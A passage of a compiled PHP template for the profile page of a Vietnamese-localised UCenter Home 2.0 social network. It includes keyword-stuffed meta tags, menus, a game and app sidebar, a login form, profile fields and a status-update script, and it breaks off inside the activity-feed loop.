<?php if(!defined('IN_UCHOME')) exit('Access Denied');?><?php subtplcheck('template/default/space_index|template/default/header|template/default/space_status|template/default/space_feed_li|template/default/space_comment_li|template/default/footer', '1315016529', 'template/default/space_index');?>﻿<?php $_TPL['nosidebar']=1; ?>
<?php if(empty($_SGLOBAL['inajax'])) { ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=<?=$_SC['charset']?>" />
<meta http-equiv="x-ua-compatible" content="ie=7" />
<title><?php if($_TPL['titles']) { ?><?php if(is_array($_TPL['titles'])) { foreach($_TPL['titles'] as $value) { ?><?php if($value) { ?><?=$value?> - <?php } ?><?php } } ?><?php } ?><?php if($_SN[$space['uid']]) { ?><?=$_SN[$space['uid']]?> - <?php } ?><?=$_SCONFIG['sitename']?> - Powered by UCenter Home 2.0 - Hỗ trợ GoHooH.CoM</title>
<meta name="keywords" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta name="description" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta http-equiv="EXPIRES" content="0" />
<meta name="RESOURCE-TYPE" content="DOCUMENT" />
<meta name="DISTRIBUTION" content="GLOBAL" />
<meta name="AUTHOR" content="Saokim999" />
<meta name="robots" content="index, follow" />
<meta name="revisit-after" content="1 days">
<script language="javascript" type="text/javascript" src="source/script_cookie.js"></script>
<script language="javascript" type="text/javascript" src="source/script_common.js"></script>
<script language="javascript" type="text/javascript" src="source/script_menu.js"></script>
<script language="javascript" type="text/javascript" src="source/script_ajax.js"></script>
<script language="javascript" type="text/javascript" src="source/script_face.js"></script>
<script language="javascript" type="text/javascript" src="source/script_manage.js"></script>
<script src="upmudim.js" type="text/javascript"></script>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
<script type="text/javascript">
try {
_uacct = "UA-4097706-3";
urchinTracker();
} catch(err) {}</script>
<style type="text/css">
@import url(template/default/style.css);
<?php if($_TPL['css']) { ?>
@import url(template/default/<?=$_TPL['css']?>.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_theme'])) { ?>
@import url(theme/<?=$_SGLOBAL['space_theme']?>/style.css);
<?php } elseif($_SCONFIG['template'] != 'default') { ?>
@import url(template/<?=$_SCONFIG['template']?>/style.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_css'])) { ?>
<?=$_SGLOBAL['space_css']?>
<?php } ?>
</style>
<link rel="shortcut icon" href="image/favicon.ico" />
<link rel="edituri" type="application/rsd+xml" title="rsd" href="xmlrpc.php?rsd=<?=$space['uid']?>" />
</head>
<body>

<div id="append_parent"></div>
<div id="ajaxwaitid"></div>
<div id="header">
<?php if($_SGLOBAL['ad']['header']) { ?><div id="ad_header"><?php adshow('header'); ?></div><?php } ?>
<div class="headerwarp">
<h1 class="logo"><a href="http://gohooh.com"><img src="template/<?=$_SCONFIG['template']?>/image/logo.gif" alt="<?=$_SCONFIG['sitename']?>" /></a></h1>
<ul class="menu">
<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=home">Trang chủ</a></li>
<li><a href="space.php">Trang cá nhân</a></li>
<li><a href="space.php?do=friend">Bạn bè</a></li>
<li><a href="network.php">Cộng đồng</a></li>
                <?php } else { ?>
<li><a href="index.php">Trang chính</a></li>
<?php } ?>

<?php if($_SGLOBAL['appmenu']) { ?>
<?php if($_SGLOBAL['appmenus']) { ?>
<li class="dropmenu" id="ucappmenu" onclick="showMenu(this.id)">
<a href="javascript:;">Site Menu</a>
</li>
<?php } else { ?>
<li><a target="_blank" href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php } ?>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=pm<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>&filter=newpm<?php } ?>">Tin nhắn<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>(Mới)<?php } ?></a></li>
<?php if($_SGLOBAL['member']['allnotenum']) { ?><li class="notify" id="membernotemenu" onmouseover="showMenu(this.id)"><a href="space.php?do=notice"><?=$_SGLOBAL['member']['allnotenum']?>Một thông điệp</a></li><?php } ?>
<?php } else { ?>
<li><a href="help.php">Trợ giúp</a></li>
<?php } ?>
</ul>

<div class="nav_account">
<?php if($_SGLOBAL['supe_uid']) { ?>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="loginName"><?=$_SN[$_SGLOBAL['supe_uid']]?></a>
<?php if($_SGLOBAL['member']['credit']) { ?>
<a href="cp.php?ac=credit" style="font-size:11px;padding:0 0 0 5px;"><img src="image/credit.gif"><?=$_SGLOBAL['member']['credit']?></a>
<?php } ?>
<br />
<?php if(empty($_SCONFIG['closeinvite'])) { ?>
<a href="cp.php?ac=invite">Mời</a> 
<?php } ?>
<a href="cp.php?ac=task">Task</a> 
<a href="cp.php?ac=magic">Thẻ Vip</a>
<a href="cp.php">CP</a> 
<a href="cp.php?ac=common&op=logout&uhash=<?=$_SGLOBAL['uhash']?>">Thoát</a>
<?php } else { ?>
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
Welcome<br>
<a href="do.php?ac=<?=$_SCONFIG['login_action']?>">Đăng nhập</a> | 
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>">Đăng ký</a>
<?php } ?>
</div>
</div>
</div>

<div id="wrap">

<?php if(empty($_TPL['nosidebar'])) { ?>
<div id="main">
<div id="app_sidebar">
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul class="app_list" id="default_userapp">
<li><img src="image/app/doing.gif"><a href="space.php?do=doing">Status</a></li>
<li><img src="image/app/album.gif"><a href="space.php?do=album">Album</a><em><a href="cp.php?ac=upload" class="gray">Upload</a></em></li>
<li><img src="image/app/blog.gif"><a href="space.php?do=blog">Blogs</a><em><a href="cp.php?ac=blog" class="gray">Viết</a></em></li>
<li><img src="image/app/poll.gif"/><a href="space.php?do=poll">Poll</a><em><a href="cp.php?ac=poll" class="gray">Bình chọn</a></em></li>
<li><img src="image/app/mtag.gif"><a href="space.php?do=mtag">Group</a><em><a href="cp.php?ac=thread" class="gray">Tạo</a></em></li>
<li><img src="image/app/event.gif"/><a href="space.php?do=event">Event</a><em><a href="cp.php?ac=event" class="gray">Bắt đầu</a></em></li>
<li><img src="image/app/share.gif"><a href="space.php?do=share">Share</a></li>
<li><img src="image/app/topic.gif"><a href="space.php?do=topic">Topic</a></li>
<li><img src="image/app/farm.gif"><a href="qqfarm.php">Nông trại</a></li>
<li><img src="image/app/fish.gif"><a href="fish.php">Ao cá</a></li>
<li><img src="image/app/love.gif"><a href="house.php">Hạnh phúc</a></li>
<li><img src="image/app/clxj.gif"><a href="clxj.php">Audition</a></li>
<li><img src="image/app/thinhthay.jpg"><a href="thayboi.php">Thầy bói</a></li>
<li><img src="image/app/blq.gif"><a href="blq.php">Bowling</a></li>
<li><img src="image/app/daovang.gif"><a href="daovang.php">Đào vàng</a></li>
<li><img src="image/app/gohoohhungtrung.gif"><a href="gohoohhungtrung.php">Hứng trứng</a></li>
<li><img src="image/app/duluong.gif"><a href="duluong.php">Dù lượng</a></li>
<li><img src="image/app/dapthu.gif"><a href="dapthu.php">Đập thú</a></li>
<li><img src="image/app/bangau.gif"><a href="bangau.php">Trượt tuyết</a></li>
<li><img src="image/app/xeptraicay.gif"><a href="xeptraicay.php">Xếp trái cây</a></li>
<li><img src="image/app/thamhiem.gif"><a href="thamhiem.php">Thám hiểm</a></li>
</ul>

<ul class="app_list topline" id="my_defaultapp">
<?php if($_SCONFIG['my_status']) { ?>
<?php if(is_array($_SGLOBAL['userapp'])) { foreach($_SGLOBAL['userapp'] as $value) { ?>
<li><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>"><?=$value['appname']?></a></li>
<?php } } ?>
<?php } ?>
</ul>

<?php if($_SCONFIG['my_status']) { ?>
<ul class="app_list topline" id="my_userapp">
<?php if(is_array($_SGLOBAL['my_menu'])) { foreach($_SGLOBAL['my_menu'] as $value) { ?>
<li id="userapp_li_<?=$value['appid']?>"><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>" title="<?=$value['appname']?>"><?=$value['appname']?></a></li>
<?php } } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['my_menu_more']) { ?>
<p class="app_more"><a href="javascript:;" id="a_app_more" onclick="userapp_open();" class="off">Mở rộng</a></p>
<?php } ?>

<?php if($_SCONFIG['my_status']) { ?>
<div class="app_m">
<ul>
<li><img src="image/app_add.gif"><a href="cp.php?ac=userapp&my_suffix=%2Fapp%2Flist" class="addApp">Thêm ứng dụng</a></li>
<li><img src="image/app_set.gif"><a href="cp.php?ac=userapp&op=menu" class="myApp">Quản lý Apps</a></li>
</ul>
</div>
<?php } ?>

<?php } else { ?>
<div class="bar_text">
<form id="loginform" name="loginform" action="do.php?ac=<?=$_SCONFIG['login_action']?>&ref" method="post">
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
<p class="title">Đăng nhập Web</p>
<p>User name</p>
<p><input type="text" name="username" id="username" class="t_input" size="15" value="" /></p>
<p>Password</p>
<p><input type="password" name="password" id="password" class="t_input" size="15" value="" /></p>
<p><input type="checkbox" id="cookietime" name="cookietime" value="315360000" checked /><label for="cookietime">Nhớ mật khẩu</label></p>
<p>
<input type="submit" id="loginsubmit" name="loginsubmit" value="Đăng nhập" class="submit" />
<input type="button" name="regbutton" value="Đăng ký" class="button" onclick="urlto('do.php?ac=<?=$_SCONFIG['register_action']?>');">
</p>
</form>
</div>
<?php } ?>
</div>

<div id="mainarea">

<?php if($_SGLOBAL['ad']['contenttop']) { ?><div id="ad_contenttop"><?php adshow('contenttop'); ?></div><?php } ?>
<?php } ?>

<?php } ?>

 <!--Translated by Saokim999 & kienngohik, Vào www.traitimyenbai.net Để cập nhập lang việt, tem và ứng dụng.-->
<?php if($narrowlist || $widelist) { ?>
<script type="text/javascript" src="source/script_swfobject.js"></script>
<?php } ?>

<div id="space_page">

<div id="ubar">

<div id="space_avatar">
<?php if($space['magicstar'] && $space['magicexpire']>$_SGLOBAL['timestamp']) { ?>
<div class="magicstar">
<object codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,45,0" width="200" height="250">
<param name="movie" value="image/magic/star/<?=$space['magicstar']?>.swf" />
<param name="quality" value="high" />
<param NAME="wmode" value="transparent">
<embed src="image/magic/star/<?=$space['magicstar']?>.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash"  wmode="transparent" width="200" height="250"></embed>
</object>
</div>

<div class="magicavatar"><?php } else { ?><div><?php } ?><?php echo avatar($space[uid],big); ?></div>

</div>

<?php if($space['self'] && $_SGLOBAL['magic']['superstar']) { ?>
<div class="borderbox">
<div style="width:100%; overflow:hidden;">
<img src="image/magic/superstar.small.gif" class="magicicon" />
<?php if($space['magicstar'] && $space['magicexpire']>$_SGLOBAL['timestamp']) { ?>
<a id="a_magic_superstar" href="cp.php?ac=magic&op=cancelsuperstar" onclick="ajaxmenu(event, this.id)">Hủy Superstar</a>
<?php } else { ?>
<a id="a_magic_superstar" href="magic.php?mid=superstar" onclick="ajaxmenu(event, this.id, 1)">Trở thành Superstar</a>
<?php } ?>
</div>
</div><br />
<?php } ?>

<div class="borderbox">
<ul class="spacemenu_list" style="width:100%; overflow:hidden;">
<?php if($space['self']) { ?>
<li><a href="cp.php?ac=avatar">Avatar</a></li>
<li><a href="cp.php?ac=profile">Edit Profile</a></li>
<li><a href="cp.php?ac=theme">Giao diện</a></li>
<li><a href="cp.php?ac=credit">Điểm số</a></li>
<?php if($_SCONFIG['sendmailday']) { ?>
<li><a href="cp.php?ac=sendmail">Cài Email</a></li>
<?php } ?>
<li><a href="cp.php?ac=privacy">Riêng tư</a></li>
<?php } else { ?>
<?php if(!$space['isfriend']) { ?>
<li><img src="image/icon/friend.gif"><a href="cp.php?ac=friend&op=add&uid=<?=$space['uid']?>" id="a_friend_li" onclick="ajaxmenu(event, this.id, 1)">Kết bạn</a></li>
<?php } ?>
<li><img src="image/icon/pm.gif"><a href="cp.php?ac=pm&uid=<?=$space['uid']?>" id="a_pm" onclick="ajaxmenu(event, this.id, 1)">Send PM</a></li>
<li><img src="image/icon/poke.gif"><a href="cp.php?ac=poke&op=send&uid=<?=$space['uid']?>" id="a_poke" onclick="ajaxmenu(event, this.id, 1)">Chọc tức</a></li>
<li><img src="image/icon/wall.gif"><a href="#comment">Tường</a></li>
<?php if($space['isfriend']) { ?>
<li><img src="image/icon/friend.gif"><a href="cp.php?ac=friend&op=ignore&uid=<?=$space['uid']?>" id="a_ignore" onclick="ajaxmenu(event, this.id)">Từ chối</a></li>
<?php } ?>
<li><img src="image/icon/report.gif"><a href="cp.php?ac=common&op=report&idtype=uid&id=<?=$space['uid']?>" id="a_report" onclick="ajaxmenu(event, this.id, 1)">Báo cáo</a></li>
<?php if(checkperm('managename')||checkperm('managespacegroup')||checkperm('managespaceinfo')||checkperm('managespacecredit')||checkperm('managespacenote')) { ?>
<li><img src="image/icon/profile.gif"><a href="admincp.php?ac=space&op=manage&uid=<?=$space['uid']?>" id="a_manage">Quản lý</a></li>
<?php } ?>
<?php } ?>
</ul>
</div><br />

<div id="space_mymenu">
<h2>Space Menu</h2>
<ul class="line_list">
<li>
<?php if($space['self']) { ?>
<a href="cp.php?ac=profile" class="r_option" target="_blank">Cập nhập</a>
<?php } ?>
<img src="image/icon/profile.gif"><a href="javascript:;" onclick="getindex('info');">Về tôi</a>
</li>
<li>
<?php if($space['self']) { ?>
<a href="space.php?do=doing&view=me" class="r_option" target="_blank">My Status</a>
<?php } ?>
<img src="image/icon/doing.gif"><a href="javascript:;" onclick="getindex('doing');">Trạng thái</a><?php if($space['doingnum']) { ?><em>(<?=$space['doingnum']?>)</em><?php } ?>
</li>
<li>
<?php if($space['self']) { ?>
<a href="cp.php?ac=blog" class="r_option" target="_blank">Viết Blog</a>
<?php } ?>
<img src="image/icon/blog.gif"><a href="javascript:;" onclick="getindex('blog');">Blog</a><?php if($space['blognum']) { ?><em>(<?=$space['blognum']?>)</em><?php } ?></li>
<li><?php if($space['self']) { ?>
<a href="cp.php?ac=upload" class="r_option" target="_blank">Upload</a>
<?php } ?>
<img src="image/icon/album.gif"><a href="javascript:;" onclick="getindex('album');">Album</a><?php if($space['albumnum']) { ?><em>(<?=$space['albumnum']?>)</em><?php } ?></li>
<li><?php if($space['self']) { ?>
<a href="cp.php?ac=thread" class="r_option" target="_blank">Thêm mới</a>
<?php } ?>
<img src="image/icon/thread.gif"><a href="javascript:;" onclick="getindex('thread');">Thảo luận</a><?php if($space['threadnum']) { ?><em>(<?=$space['threadnum']?>)</em><?php } ?></li>
<li><?php if($space['self']) { ?>
<a href="cp.php?ac=poll" class="r_option" target="_blank">Tạo mới</a>
<?php } ?>
<img src="image/icon/poll.gif"><a href="javascript:;" onclick="getindex('poll');">Vote</a><?php if($space['pollnum']) { ?><em>(<?=$space['pollnum']?>)</em><?php } ?></li>
<li><?php if($space['self']) { ?>
<a href="cp.php?ac=event" class="r_option" target="_blank">Tạo Event</a>
<?php } ?>
<img src="image/icon/event.gif"><a href="javascript:;" onclick="getindex('event');">Event</a><?php if($space['eventnum']) { ?><em>(<?=$space['eventnum']?>)</em><?php } ?></li>
<li><?php if($space['self']) { ?>
<a href="space.php?do=share&view=me" class="r_option" target="_blank">Thêm mới</a>
<?php } ?>
<img src="image/icon/share.gif"><a href="javascript:;" onclick="getindex('share');">Share</a><?php if($space['sharenum']) { ?><em>(<?=$space['sharenum']?>)</em><?php } ?></li>
<li><?php if($space['self']) { ?>
<a href="cp.php?ac=friend&op=search" class="r_option" target="_blank">Tìm bạn</a>
<?php } ?>
<img src="image/icon/friend.gif"><a href="javascript:;" onclick="getindex('friend');">Bạn bè</a><?php if($space['friendnum']) { ?><em>(<?=$space['friendnum']?>)</em><?php } ?></li>
</ul>
</div>

<?php if($guidelist) { ?>
<div id="space_app_guide">
<h2>Các ứng dụng</h2>
<ul class="line_list">
<?php if(is_array($guidelist)) { foreach($guidelist as $value) { ?>
<li id="space_app_profilelink_<?=$value['appid']?>">
<?php if($space['self']) { ?>
<a href="cp.php?ac=space&op=delete&appid=<?=$value['appid']?>&type=profilelink" id="user_app_profile_<?=$value['appid']?>" class="r_option float_del" style="position: static;" onclick="ajaxmenu(event, this.id)" title="Delete">Xóa</a>
<?php } ?>
<img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><?php eval($value[profilelink]); ?>
</li>
<?php } } ?>
</ul>
</div>
<?php } ?>

<?php if(is_array($narrowlist)) { foreach($narrowlist as $value) { ?>
<div id="space_app_<?=$value['appid']?>">
<h2>
<?php if($space['self']) { ?>
<a href="cp.php?ac=space&op=delete&appid=<?=$value['appid']?>" id="user_app_<?=$value['appid']?>" class="r_option float_del" onclick="ajaxmenu(event, this.id)" title="Remove">Remove</a>
<?php } ?>
<a href="<?=$value['appurl']?>"><?=$value['appname']?></a>
</h2>
<?php if($value['myml']) { ?>
<div class="box">
<?php eval($value[myml]); ?>
</div>
<?php } ?>
</div>
<?php } } ?>

</div>

<div id="content">

<h3 id="spaceindex_name">
<?php if($_SCONFIG['realname']) { ?>
<?php if($space['name']) { ?><a href="space.php?uid=<?=$space['uid']?>"<?php g_color($space[groupid]); ?>><?=$space['name']?></a><?php } else { ?> Name not verified <?php } ?>
&nbsp;<em>(Nickname: <?=$space['username']?>)</em>
<?php } else { ?>
<a href="space.php?uid=<?=$space['uid']?>"<?php g_color($space[groupid]); ?>><?=$space['username']?></a>
<?php if($space['name']) { ?>&nbsp;<em>(Tên thật: <?=$space['name']?>)</em><?php } ?>
<?php } ?>

<?php if($_SCONFIG['realname']) { ?>
<?php if($space['namestatus']) { ?>
&nbsp;<img src="image/realname_yes.gif" align="absmiddle" alt="Real Name Verified ">
<?php } else { ?>
&nbsp;<img src="image/realname_no.gif" align="absmiddle" alt="Name not verified"> <span class="gray">Name not verified</span>
<?php } ?>
<?php } ?>

<?php if($_SCONFIG['videophoto']) { ?>	
<?php if($space['videostatus']) { ?>
&nbsp;<img src="image/videophoto_yes.gif" align="absmiddle" alt="has been verified via WebCam"> <a id="a_space_videophoto" href="space.php?uid=<?=$space['uid']?>&do=videophoto" onclick="ajaxmenu(event, this.id, 1)"><span style="color:red;font-weight:bold;font-size:12px;">View WebCam verified License</span></a>
<?php } else { ?>
&nbsp; <img src="image/videophoto_no.gif" align="absmiddle" alt="not verified via WebCam"> <span class="gray"><a href="cp.php?ac=videophoto">User is not certified via WebCam </a></span>
<?php } ?>
<?php } ?>
</h3>


<div id="spaceindex_note">
<a href="cp.php?ac=share&type=space&id=<?=$space['uid']?>" class="a_share" id="a_share" onclick="ajaxmenu(event, this.id, 1)">Share</a>
<a href="rss.php?uid=<?=$space['uid']?>" id="i_rss" title="Subscribe RSS">RSS</a>

<ul class="note_list">
<li>Thống kê: <?=$space['viewnum']?> lượt ghé thăm, Tiền: <?=$space['credit']?>, Kinh nghiệm: <?=$space['experience']?> <?=$space['star']?></li>
<li>Cấp độ: <a href="cp.php?ac=credit&op=usergroup"><?=$_SGLOBAL['grouptitle'][$space['groupid']]['grouptitle']?></a> <?php g_icon($space[groupid]); ?></li>
<li>Trang cá nhân: <a href="<?=$space['domainurl']?>" onclick="javascript:setCopy('<?=$space['domainurl']?>');return false;" class="spacelink domainurl"><?=$space['domainurl']?></a></li>

<?php if(!$space['self'] && $space['spacenote']) { ?>
<li><?=$space['spacenote']?> <a href="space.php?uid=<?=$space['uid']?>&do=doing">&raquo;</a></li>
<?php } ?>
</ul>

<?php if($space['self']) { ?>
<div id="mood_mystatus">
<?=$space['spacenote']?>
</div>

<div id="mood_form">
<form method="post" action="cp.php?ac=doing" id="mood_addform">
<div id="mood_statusinput" class="statusinput"><textarea name="message" id="mood_message" onclick="statusFace();" onkeydown="if(event.keyCode == 13 ){ event.returnValue=false;event.cancel = true;$('mood_add').click();$('mood_message').value='';this.blur(); };" >Cập nhập cảm xúc, trạng thái, tin nhắn!</textarea></div>
<div class="statussubmit">
<input type="button" id="mood_add" name="add" value=">OK<" class="submit" style="display:none;" onclick="ajaxpost('mood_addform', 'reloadMood');$('mood_message').value='';" />
<input type="hidden" name="addsubmit" value="true" />
<input type="hidden" name="spacenote" value="true" />
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
</div>

</form>
</div>


<script type="text/javascript">
function statusFace() {
if($('mood_message').value == 'Cập nhập cảm xúc, trạng thái, tin nhắn!'){
$('mood_message').value = '';
}
$('mood_statusinput').style.zIndex = '20005';
$('mood_statusinput').className = 'statusinput2';
$('mood_add').style.display = 'block';


var div = $('mood_face_bg');
if(div) {
div.parentNode.removeChild(div);
}
div = document.createElement('div');
div.id = 'mood_face_bg';
div.style.position = 'absolute';
div.style.left = div.style.top = '0px';
div.style.width = '100%';
div.style.height = document.body.scrollHeight + 'px';
div.style.backgroundColor = '#000';
div.style.zIndex = 10000;
div.style.display = 'none';
div.style.filter = 'alpha(opacity=0)';
div.style.opacity = 0;
div.onclick = function() {
hiddenstatus();
}
$('append_parent').appendChild(div);


if($('mood_message_menu') != null) {
$('mood_message_menu').style.display = '';
$('mood_add').style.display = '';
} else {
var faceDiv = document.createElement("div");
faceDiv.id = 'mood_message_menu';
faceDiv.className = 'facebox';
faceDiv.style.position = 'absolute';
var faceul = document.createElement("ul");
for(i=1; i<31; i++) {
getStatusFace(i, faceul);	
}
faceDiv.appendChild(faceul);
$('append_parent').appendChild(faceDiv);
}
//¶¨Î»²Ëµ¥
setMenuPosition('mood_message', 0);
div.style.display = '';
}

function hiddenstatus() {
$('mood_message_menu').style.display = 'none';
$('mood_face_bg').style.display = 'none';
$('mood_add').style.display = 'none';
$('mood_statusinput').className = 'statusinput';
if($('mood_message').value == ''){
$('mood_message').value = 'Cập nhập cảm xúc, trạng thái, tin nhắn!';
}
$('mood_statusinput').style.zIndex = '1';
}

function getStatusFace(i, faceul) {
var faceli = document.createElement("li");
faceli.innerHTML = '<img src="image/face/'+i+'.gif" style="cursor:pointer; position:relative;" />';
faceli.getElementsByTagName('img').item(0).onclick = function(){var faceText = '[em:'+i+':]'; if($('mood_message') != null) { insertContent('mood_message', faceText); }};
faceul.appendChild(faceli);
}

function reloadMood(showid, result) {
var x = new Ajax();
x.get('cp.php?ac=doing&op=getmood', function(s){
$('mood_mystatus').innerHTML = s;
});
//ÌáÊ¾»ñµÃ»ý·Ö
showreward();
hiddenstatus();
}
</script>
<?php } ?>
</div>

<div id="maincontent">

<?php if(!$space['isfriend']) { ?>
<div class="borderbox">
<p style="padding-bottom:10px;"><b>Nếu bạn muốn hiểu rõ hơn về <?=$_SN[$space['uid']]?>, để có thể cùng nói chuyện, tâm sự chia sẻ về cuộc sống, hãy cùng kết bạn nhé</b></p>
<a href="cp.php?ac=friend&op=add&uid=<?=$space['uid']?>" id="a_friend_notice" onclick="ajaxmenu(event, this.id, 1)" class="submit">Kết bạn với <?=$_SN[$space['uid']]?></a></p>
</div><br>
<?php } ?>

<div id="space_info">
<h3 class="feed_header">
<?php if($space['self']) { ?>
<a href="cp.php?ac=profile" class="r_option">Edit thông tin cá nhân</a>
<?php } ?>
Thông tin cá nhân
</h3>
<ul class="spacemenu_list">
<li><em>Tham gia từ:</em><?php echo sgmdate('d-m-Y',$space[dateline],1); ?></li>
<li><em>Đăng nhập lần cuối:</em><?php if($space['lastlogin']) { ?><?php echo sgmdate('d-m-Y',$space[lastlogin],1); ?><?php } ?></li>
<?php if($isonline) { ?>
<li><em>Status:</em><?=$isonline?> (Online Now)</li>
<?php } ?>
<?php if($space['sex']) { ?>
<li><em>Giới tính:</em><?=$space['sex']?></li>
<?php } ?>
<?php if($space['birth']) { ?>
<li><em>Ngày sinh:</em><?=$space['birth']?></li>
<?php } ?>
<?php if($space['blood']) { ?>
<li><em>Nhóm máu:</em><?=$space['blood']?></li>
<?php } ?>
<?php if($space['marry']) { ?>
<li><em>Hôn nhân:</em><?=$space['marry']?></li>
<?php } ?>

<?php if($space['residecity']) { ?>
<li><em>Nơi ở hiện tại:</em><?=$space['residecity']?></li>
<?php } ?>
<?php if($space['birthcity']) { ?>
<li><em>Nơi sinh:</em><?=$space['birthcity']?></li>
<?php } ?>
<?php if($space['mobile']) { ?>
<li><em>Mobile:</em><?=$space['mobile']?></li>
<?php } ?>
<li><em>MSN:</em><?=$space['msn']?></li>
<?php if($space['qq']) { ?>
<li><em>QQ:</em><?=$space['qq']?></li>
<?php } ?>
</ul>
<p class="info_more"><a href="javascript:;" onclick="getindex('info');">&raquo; Xem tất cả thông tin</a></p>
</div>

<?php if($feedlist) { ?>
<?php $_TPL['hidden_hot']=1; ?>
<div id="space_feed" class="feed">
<h3 class="feed_header">
<span class="r_option">
<a href="space.php?uid=<?=$space['uid']?>&do=feed&view=me" class="action">All</a>
</span>
<span class="entry-title">Cập nhập hoạt động</span>
</h3>
<div class="box_content">
<ul>
<?php if(is_array($feedlist)) { foreach($feedlist as $value) { ?>
<li class="s_clear <?=$value['magic_class']?>" id="feed_<?=$value['feedid']?>_li" onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);">
<div style="width:100%;overflow:hidden;" <?=$value['style']?>>
<?php if($value['uid'] && empty($_TPL['hidden_more'])) { ?>
<a href="cp.php?ac=feed&op=menu&feedid=<?=$value['feedid']?>" class="float_more" id="a_feed_menu_<?=$value['feedid']?>"  onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);" onclick="ajaxmenu(event, this.id)" title="More options" style="display:none;">Menu</a>
<?php } ?>
